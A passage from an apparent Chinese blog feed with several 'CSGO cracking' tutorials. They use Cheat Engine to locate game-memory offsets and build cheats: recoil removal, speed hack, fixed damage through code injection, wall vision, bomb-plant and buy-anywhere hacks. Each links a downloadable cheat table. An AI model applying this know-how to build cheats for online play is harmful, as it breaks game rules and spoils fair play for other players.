    <link href="https://www.ascotbe.com/2022/05/12/CSGO_0x07/"/>
    <id>https://www.ascotbe.com/2022/05/12/CSGO_0x07/</id>
    <published>2022-05-12T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.872Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/0000000.png" alt="000000"></p><h3 id="分析游戏的结构体"><a href="#分析游戏的结构体" class="headerlink" title="分析游戏的结构体"></a>分析游戏的结构体</h3><p>首先我们拿出我们之前的基地址进行结构体分析</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/130.png" alt="image-20220509205633103"></p><p>然后往下拉找到<strong>7C</strong> 这个位置</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/131.png" alt="image-20220509205718878"></p><p>打开有这些结构体，我们一个一个的点开看，7C的00便宜没有什么数据，但是04偏移打开竟然看到了我们的指针</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/132.png" alt="image-20220509205912439"></p><p>那么X坐标的真实偏移应该是<code>cstrike.exe+11069BC+7C+04+08</code>，而不是<code>cstrike.exe+11069BC+88</code>，那么我们就可以印证了上一篇的猜想</p><h3 id="查找准心指向"><a href="#查找准心指向" class="headerlink" title="查找准心指向"></a>查找准心指向</h3><p>我们首先新建一个未知的扫描（新建的时候需要把准心对着墙壁），然后把准心对着自己队友后选择变化了，然后移到墙上搜索变化了，往复搜索最终会得到</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/133.png" alt="image-20220509212153725"></p><p>这些数据，然后我们在跑到敌人的位置，把准心对着敌人然后在搜索变化了</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/134.png" alt="image-20220509212350804"></p><p>就剩下这几个值，接着我们对着另一个敌人</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/135.png" alt="image-20220509212449845"></p><p>可以看到一个值还是2，而一个值变成了6，那么我们就根据之前搜索到的数据来判断，<code>09E1DBD8</code>这个是阵营，<code>09E1DBDC</code>是敌人编号，然后我们看之前的偏移值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/136.png" alt="image-20220509213529392"></p><p>和上面的偏移相差不大，所以就得到了下面的地址</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/137.png" alt="image-20220509213944846"></p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/CSGO1.6-7.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="逆向" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/%E5%A4%96%E6%8C%82/"/>
    
    
    <category term="CSGO" scheme="https://www.ascotbe.com/tags/CSGO/"/>
    
    <category term="破解" scheme="https://www.ascotbe.com/tags/%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/tags/%E5%A4%96%E6%8C%82/"/>
    
  </entry>
  
  <entry>
    <title>CSGO破解学习(六)</title>
    <link href="https://www.ascotbe.com/2022/04/27/CSGO_0x06/"/>
    <id>https://www.ascotbe.com/2022/04/27/CSGO_0x06/</id>
    <published>2022-04-27T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.849Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/000000.png" alt="000000"></p><h3 id="获取手雷地址"><a href="#获取手雷地址" class="headerlink" title="获取手雷地址"></a>获取手雷地址</h3><p>首先需要找到手雷的基地址，通过买手雷，然后丢了，然后在买进行搜索</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/113.png" alt="image-20220425164747129"></p><p>然后在基地址中筛选最终的值为<code>0583D9F8</code>接着找基地址，右键查看什么修改了它</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/114.png" alt="image-20220425164845990"></p><p>可以看到这个值和我们之前的不太一样，它是<code>ecx+eax*4+000005F8</code> 也就是说<code>0583D3D0+C*4+5F8</code>，算出结果是<code>0583D3D0+628</code>，接着使用结构体的方式来确认数值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/115.gif" alt="1"></p><p>为什么上图的地址是<code>18B19630</code>而不是<code>0583D3D0</code>了是因为我切换了地图</p><h3 id="猜测以及思考"><a href="#猜测以及思考" class="headerlink" title="猜测以及思考"></a>猜测以及思考</h3><p>通过找了这么多的数据，我们可以进行一下分析，大概可以猜测一下人物的结构体</p><ul><li>cstrike.exe+11069BC+7c存放的是整个人物的基址</li><li>cstrike.exe+11069BC+7c+4存放的关于游戏内人物具体属性的具体地址</li><li>cstrike.exe+11069BC+7c+5F0 存放的是使用武器的地址</li></ul><p>我们通过猜测结构体，来到具体的内存位置，对人物进行操作，然后对内存进行观察，可以发现一些其他好玩的数据。</p><h3 id="攻击冷却-amp-武器使用标记"><a href="#攻击冷却-amp-武器使用标记" class="headerlink" title="攻击冷却&amp;武器使用标记"></a>攻击冷却&amp;武器使用标记</h3><p>由于我们可以知道<code>cstrike.exe+11069BC+7C+5F0+CC</code>这个地方存放的是武器的子弹数，那么我们先获取<code>cstrike.exe+11069BC+7C+5F0</code>指向的值也就是武器的地址，下面分别是主武器，副武器，刀的三个地址</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/116.png" alt="image-20220426231935364"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/117.png" alt="image-20220426231957369"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/118.png" alt="image-20220426232018302"></p><p>地址分别是<code>0A4C62E0</code> 、<code>058F1FA0</code> 、<code>0A162CE0</code>，接着在武器的地址的地址右键浏览相关内存区域</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/119.png" alt="image-20220426232140722"></p><p>然后添加两个变量</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/120.png" alt="image-20220426232336358"></p><p>然后把值填进去，后点击结构</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/121.png" alt="image-20220426232328656"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/122.png" alt="image-20220426232425204"></p><p>接着在这范围内找值可以看到<strong>D4</strong>这边的值，在我们切换武器的时候不同的地址都会变成1</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/123.gif" alt="2"></p><p>但是有些参数他不一定是4bytes类型的，我们可以修改，像那种数值非常大的一半都是单浮点或者双浮点</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/124.png" alt="image-20220426232619137"></p><p>这个地方可以修改为单浮点</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/125.png" alt="image-20220426232645140"></p><p>然后我们修改完以后可以去查找开枪不开枪之类的有什么变化，在<strong>B8</strong>这个位置，发现开枪值会改变，不开枪后会变回-1</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/126.gif" alt="2"></p><p>我们看下锁定这个值是怎么样的</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/127.gif" alt="2"></p><p>光速攻击，最终两个值的基地址如下</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/128.png" alt="image-20220426233817161"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/129.png" alt="image-20220426233827776"></p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/CSGO1.6-6.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="逆向" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/%E5%A4%96%E6%8C%82/"/>
    
    
    <category term="CSGO" scheme="https://www.ascotbe.com/tags/CSGO/"/>
    
    <category term="破解" scheme="https://www.ascotbe.com/tags/%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/tags/%E5%A4%96%E6%8C%82/"/>
    
  </entry>
  
  <entry>
    <title>CSGO破解学习(五)</title>
    <link href="https://www.ascotbe.com/2022/04/24/CSGO_0x05/"/>
    <id>https://www.ascotbe.com/2022/04/24/CSGO_0x05/</id>
    <published>2022-04-24T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.805Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/00000.png" alt="image-20220420201018769" style="zoom:25%;" /></p><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><ul><li>CSGO版本更改为v3248（对之前版本的基地址进行了修改）</li></ul><h3 id="获取自己和敌人坐标"><a href="#获取自己和敌人坐标" class="headerlink" title="获取自己和敌人坐标"></a>获取自己和敌人坐标</h3><p>首先站在平面上搜索单浮点</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/93.png" alt="image-20220420201018769"></p><p>然后在最低点的石头上搜索增加的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/94.png" alt="image-20220420201124730"></p><p>接着走到顶还是搜索增加的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/95.png" alt="image-20220420201223600"></p><p>接着跳下来搜索减少的</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/96.png" alt="image-20220420201305589"></p><p>然后乱动搜索未变动的</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/97.png" alt="image-20220420201403637"></p><p>然后跳起来的瞬间搜索变动的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/98.png" alt="image-20220420201455180"></p><p>接着一个值一个值的去测试，但是这种很大的值和0都不用管它，找那种大量一样的值，然后批量选择按空格键锁定，看下人物能不能调高，如果不行那么就表示这个值是对的，最终锁定了这个值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/99.gif" alt="2"></p><p>然后就是通过老方法找基址了</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/100.png" alt="image-20220420202143069"></p><p>接着搜索</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/101.png" alt="image-20220420202613049"></p><p>一下子就找到了，一个是我们的地址，一个是敌人的地址，接着浏览相关内存区域</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/102.png" alt="image-20220420202719548"></p><p>就能找到X和Y的坐标了</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/103.png" alt="image-20220420203509295"></p><p>然后同理找到我们和敌人共用的内存地址</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/104.png" alt="image-20220420203606049"></p><p>然后验证下</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/105.gif" alt="2"></p><p>切记要等他指针变成不是你自己地址的时候去修改他</p><h3 id="随时下包"><a href="#随时下包" class="headerlink" title="随时下包"></a>随时下包</h3><p>首先搜索未知地址然后进入到下包点</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/106.png" alt="image-20220422145218406"></p><p>看到这个变成红绿闪烁的时候搜索变动的值，然后离开下包点</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/107.png" alt="image-20220422145355466"></p><p>等这个变成绿色的时候再次搜索变动的，以此往复</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/108.png" alt="image-20220422141752176"></p><p>可以看到有大量的数据，我们并不知道下包是哪个值所以我们把所有各位的字全部选取下来，然后修改1-5这几个数字进行测试，最终发现2是下包值，然后进行筛选</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/109.gif" alt="3"></p><p>发现了一个绿色的基址代表信号闪烁的，剩下两个值都是临时地址，一个控制两个值，一个是控制下包的</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/110.png" alt="image-20220422143857768"></p><p>接着找基址，通过老方法</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/111.png" alt="image-20220422144645302"></p><p>找到地址为这个，切换地图也是可以使用的</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/112.gif" alt="4"></p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/CSGO1.6-5.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="逆向" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/%E5%A4%96%E6%8C%82/"/>
    
    
    <category term="CSGO" scheme="https://www.ascotbe.com/tags/CSGO/"/>
    
    <category term="破解" scheme="https://www.ascotbe.com/tags/%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/tags/%E5%A4%96%E6%8C%82/"/>
    
  </entry>
  
  <entry>
    <title>CSGO破解学习(四)</title>
    <link href="https://www.ascotbe.com/2022/04/17/CSGO_0x04/"/>
    <id>https://www.ascotbe.com/2022/04/17/CSGO_0x04/</id>
    <published>2022-04-17T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.611Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/0000.png" alt="00000"></p><h3 id="手枪连发"><a href="#手枪连发" class="headerlink" title="手枪连发"></a>手枪连发</h3><p>查找方式和之前的无后座力一样的操作，通过浏览内存地址区域（当前角色的主武器子弹地址），然后我们可以看到，开枪后按住左键只有一个地址在疯狂跳动，松开武器后直接变为了0</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/62.gif" alt="1"></p><p>我们把这个地址添加到列表中，然后锁定他</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/63.gif" alt="1"></p><p>可以看到手枪变成了冲锋枪，然后通过基地址一查，和冲锋枪的无后座力是同一个值，我们锁定无后座力的值查看</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/64.gif" alt="1"></p><h3 id="辨别敌我"><a href="#辨别敌我" class="headerlink" title="辨别敌我"></a>辨别敌我</h3><p>首先添加3个机器人，然后按<code>~</code>键弹出控制面板，输入<strong>bot_stop 1</strong></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/65.png" alt="image-20220416153756076"></p><p>接着把准心对着敌人进行进行搜索未知初始值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/66.png" alt="image-20220416154200275"></p><p>然后把准心移开后搜索变动的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/67.png" alt="image-20220416154520881"></p><p>接着乱跑乱动后搜索未变动的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/68.png" alt="image-20220416154737755"></p><p>接着把准心再次放到敌人身上搜索变动的值，后重复这些动作</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/69.gif" alt="1"></p><p>最终只剩下这些值以后，当我们把鼠标当道敌人身上可以看到绿色和黑色的地址中有一个值<code>06689B2C</code>和<code>01A01F14</code>都是为2，而<code>06689B30</code>和<code>01A01F18</code>显示不同的数值，接下来我们切换到自己的阵营看看</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/70.gif" alt="1"></p><p><code>06689B2C</code>和<code>01A01F14</code>的值变成了1，而<code>06689B30</code>和<code>01A01F18</code>变成了其他值，在后续添加9个机器人的时候来验证发现如下</p><ul><li><code>06689B2C</code>和<code>01A01F14</code>的值表示阵营</li><li><code>06689B30</code>和<code>01A01F18</code>表示当前的机器人的数字</li></ul><p>然后通过断开游戏链接等方式找到了绿色的这个地址就是他的基址没有进行修改</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/71.png" alt="image-20220416160542046"></p><h3 id="固定伤害"><a href="#固定伤害" class="headerlink" title="固定伤害"></a>固定伤害</h3><p>首先搜索敌人的血量，然后在看是什么对攻击进行修改</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/72.png" alt="image-20220416201712558"></p><p>然后砍敌人一刀搜索变化的血量，然后重复该炒作，结果为这个</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/73.png" alt="image-20220416201754858"></p><p>然后找出是什么修改了它</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/74.png" alt="image-20220416202058820"></p><p>然后我们看汇编代码，有一个fsub减去的操作</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/75.png" alt="image-20220416202244076"></p><p>我们把这个给注释了看看</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/76.png" alt="image-20220416202324102"></p><p>然后回到游戏进行攻击，根本杀不死</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/77.gif" alt="1"></p><p>接着我们用脚本注入的方式修改这个值（记得把注释给还原了），<code>0x43480000</code>这个值是汇编的200值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/78.png" alt="image-20220416202743287"></p><p>添加上面的这段代码点击执行</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/79.gif" alt="1"></p><p>可以看到一枪一个队友</p><h3 id="穿墙"><a href="#穿墙" class="headerlink" title="穿墙"></a>穿墙</h3><p>首先需要开一局，然后模糊的搜索初始值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/80.png" alt="image-20220416203755160"></p><p>然后自杀，用手雷什么的，然后切换为自由视角再搜索变动的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/81.png" alt="image-20220416203920367"></p><p>然后我们乱动视角切换搜索未变动的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/82.png" alt="image-20220416204105386"></p><p>然后按ctrl键，切换视角修改变动的，一直这样搜索（按空格也行切换视角）</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/83.png" alt="image-20220416204249515"></p><p>最终只剩下这些值，然后通过二分法筛选出对的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/84.png" alt="image-20220416204753885"></p><p>然后看是什么改写了</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/85.png" alt="image-20220416204829740"></p><p>最终通过结构体的方式找到基地址</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/86.png" alt="image-20220416205248967"></p><p>接着设置热键方便我们在游戏里面切换</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/87.png" alt="image-20220416205707617"></p><p>然后删除游戏中的快捷键</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/88.gif" alt="1"></p><h3 id="人物加速"><a href="#人物加速" class="headerlink" title="人物加速"></a>人物加速</h3><p>原理就是我们拿刀的时候是速度最快的，然后是切换武器后，所以我们初始化一个浮点值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/89.png" alt="image-20220419220342123"></p><p>接着切换枪械后搜索变动，然后在切换刀还是搜索变动，最后面要是数字不动的话切换狙击枪后开镜搜索</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/90.png" alt="image-20220419220837043"></p><p>然后可以看到上图中一片的250的值我们就可以利用二分法来判断</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/91.gif" alt="2"></p><p>最终断定是这个值，然后通过结构体来找到它的基地址</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/92.png" alt="image-20220419221754934"></p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/CSGO1.6-4.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="逆向" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/%E5%A4%96%E6%8C%82/"/>
    
    
    <category term="CSGO" scheme="https://www.ascotbe.com/tags/CSGO/"/>
    
    <category term="破解" scheme="https://www.ascotbe.com/tags/%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/tags/%E5%A4%96%E6%8C%82/"/>
    
  </entry>
  
  <entry>
    <title>CSGO破解学习(三)</title>
    <link href="https://www.ascotbe.com/2022/04/15/CSGO_0x03/"/>
    <id>https://www.ascotbe.com/2022/04/15/CSGO_0x03/</id>
    <published>2022-04-15T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.870Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/000.png" alt="00" style="zoom:90%;" /></p><h3 id="被攻击不减速"><a href="#被攻击不减速" class="headerlink" title="被攻击不减速"></a>被攻击不减速</h3><p>有两种方式来搜索这个地址</p><ul><li>编辑-&gt;热键，然后在变动的数值和未变动的数值中设置快捷键，然后通过在扫描类型中选择：未知的初始化值，然后在被攻击的时候按<code>变动的数值</code>快捷键，未被攻击的时候按<code>未变动的数值</code>快捷键，来找出值（速度巨慢）</li><li>根据C++结构体的方式来查找</li></ul><p>我们可以看到所有当前角色的指针都是<code>cstrike.exe+D6E63C+7C</code>然后加上某个值，那么我们就认为它代表的是这个游戏中当前角色，所有我们使用<code>cstrike.exe+D6E63C+7C+5E8</code>的这个值来查找，右键浏览相关内存区域</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/40.png" alt="image-20220413225454915"></p><p>接着查看在内存区域右键切换数据类型</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/41.png" alt="image-20220413225620110"></p><p>最后就在攻击和被攻击的时候分别查看上面一块区域和下面一块区域的内存地址，找到想符合的值，就是这个人物结构体上下找相关的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/42.gif" alt="1"></p><p>图中纵坐标<code>0066C5670</code>横坐标<code>38</code>位置的值可以看到我们被攻击了就变成了小于1的值，如果不被攻击就为1，我们就断定他就是被攻击的小数值，然后我们右键这个值然后把他添加到列表中</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/43.png" alt="image-20220414160058409"></p><p>接着锁定他，再去让人攻击</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/44.gif" alt="1"></p><p>可以看到还是被减数了，那么就是有可能攻击频率太快，导致CE没办法锁定过来，那我们接着右键查看是什么改变了该地址，后直接用空指令替换掉第一个值，看看结果</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/45.png" alt="image-20220414161038598"></p><p>可以看到该值不动了，只剩下攻击后人物后退效果了</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/46.gif" alt="1"></p><p>接着我们测试成功后需要还原代码</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/47.png" alt="image-20220414161841267"></p><p>然后通过之前找基地在的方式来找到基地，最终找到这两个基地址</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/48.png" alt="image-20220414163513941"></p><p>然后只需要对CT表进行注入，找到这个指针右键，选择框中的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/49.png" alt="image-20220414164426178"></p><p>找到我们之前确定的被减速的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/50.png" alt="image-20220414164633992"></p><p>进入到内存浏览器后点击工具-&gt;自动汇编</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/51.png" alt="image-20220414164715191"></p><p>然后在模板的位置首先点击CT表框架代码，然后在点击代码注入</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/52.png" alt="image-20220414164955989"></p><p>可以看到<strong>originalcode:</strong>这里面的值就是每次攻击后修改的汇编指令，我们只需要删除掉他，接着点击文件-&gt;分配到当前CT表即可</p><h3 id="随地购物"><a href="#随地购物" class="headerlink" title="随地购物"></a>随地购物</h3><p>我们出现购物车的时候搜索1，而没有购物车的时候搜索0</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/53.png" alt="image-20220414170931572"></p><p>最终定位到这个值，我们锁定它，可以看到在购物外还购买了手雷</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/54.gif" alt="1"></p><p>然后右键查看是什么修改了它</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/55.png" alt="image-20220414171841260"></p><p>通过结构体的方式我们能够直接添加基地址</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/56.png" alt="image-20220414172109240"></p><h3 id="无后座力"><a href="#无后座力" class="headerlink" title="无后座力"></a>无后座力</h3><p>我们猜测如果是后坐力是不是和子弹相关，那么我们通过浏览最早的时候子弹的地址相关内存来查找</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/57.png" alt="image-20220414174154524"></p><p>对内存区域进行显示类型的转换，然后开启查看变动的值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/58.gif" alt="1"></p><p>可以看到纵坐标<code>132E0284</code>横坐标<code>58</code>的位置这个值在疯狂变动，为什么排除了纵坐标<code>132E0274</code>横坐标<code>54</code>这个值呢？因为后坐力不可能只为0或者1，后坐力是随着子弹变动的，我们把地址添加进来后锁定</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/59.gif" alt="1"></p><p>可以看到后坐力不变了，那么只需要开枪后查找是什么修改了它</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/60.png" alt="image-20220414175451275"></p><p>然后通过结构体来定位</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/61.png" alt="image-20220414175533679"></p><p>最终结果如上图</p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/CSGO1.6-3.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="逆向" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/%E5%A4%96%E6%8C%82/"/>
    
    
    <category term="CSGO" scheme="https://www.ascotbe.com/tags/CSGO/"/>
    
    <category term="破解" scheme="https://www.ascotbe.com/tags/%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/tags/%E5%A4%96%E6%8C%82/"/>
    
  </entry>
  
  <entry>
    <title>SMB匿名访问共享</title>
    <link href="https://www.ascotbe.com/2022/04/14/SMBAnonymousAccessShare/"/>
    <id>https://www.ascotbe.com/2022/04/14/SMBAnonymousAccessShare/</id>
    <published>2022-04-14T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.847Z</updated>
    
